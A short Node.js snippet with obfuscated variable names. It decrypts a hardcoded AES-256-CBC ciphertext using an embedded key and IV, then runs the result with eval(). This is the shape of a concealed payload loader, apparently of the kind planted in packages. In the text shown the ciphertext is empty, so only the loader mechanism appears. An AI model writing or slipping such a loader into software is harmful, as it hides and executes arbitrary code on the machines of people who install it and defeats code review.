const ito = require('crypto');
const itinho = Buffer.from('2b14bc46160eb44ca0fc0cdfaaed4fa83804cfb6997690b1fb13682542b8ba8f', 'hex');
const octua = Buffer.from('108ba24b953aeef20f97870fea122b63', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
